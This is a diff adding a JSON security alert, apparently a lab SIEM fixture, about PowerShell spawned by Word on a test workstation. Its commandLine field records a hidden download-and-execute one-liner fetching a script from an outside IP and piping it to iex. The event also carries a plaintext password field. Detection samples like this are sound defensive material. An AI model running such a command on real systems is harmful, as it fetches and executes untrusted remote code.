@@ -1,0 +1,27 @@
+{
+  "id": "1731390200.300003",
+  "timestamp": "2026-11-12T03:18:05.777+0000",
+  "rule": {
+    "id": "92052",
+    "level": 12,
+    "description": "Windows command prompt started by an abnormal process",
+    "groups": ["sysmon", "sysmon_event1", "windows"],
+    "mitre": {"id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"]}
+  },
+  "agent": {"id": "003", "name": "lab-ws01", "ip": "10.10.20.15"},
+  "decoder": {"name": "windows_eventchannel"},
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {"eventID": "1", "computer": "lab-ws01.lab.local"},
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell -nop -w hidden -c iwr http://203.0.113.80/a.ps1 | iex; mail bob@lab.example",
+        "user": "LAB\\bob",
+        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "hashes": "SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08",
+        "password": "Winter2026!"
+      }
+    }
+  }
+}
